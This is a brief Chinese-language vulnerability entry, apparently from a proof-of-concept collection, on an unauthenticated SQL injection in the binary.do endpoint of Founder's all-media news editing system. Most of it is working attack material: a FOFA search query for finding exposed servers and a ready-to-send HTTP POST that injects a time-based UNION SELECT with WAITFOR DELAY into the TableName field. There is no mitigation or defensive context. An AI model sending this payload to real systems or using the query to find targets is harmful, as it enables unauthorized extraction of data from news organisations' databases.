## 方正畅享全媒体新闻采编系统binary.do存在SQL注入漏洞

方正畅享全媒体新闻采编系统binary.do存在SQL注入漏洞，未经身份验证的恶意攻击者利用SQL注入漏洞获取数据库中信息。

## fofa

```
app="FOUNDER-全媒体采编系统"
```

## poc

```
POST /newsedit/newsplan/task/binary.do HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close

TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+'0:0:5';select+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
```

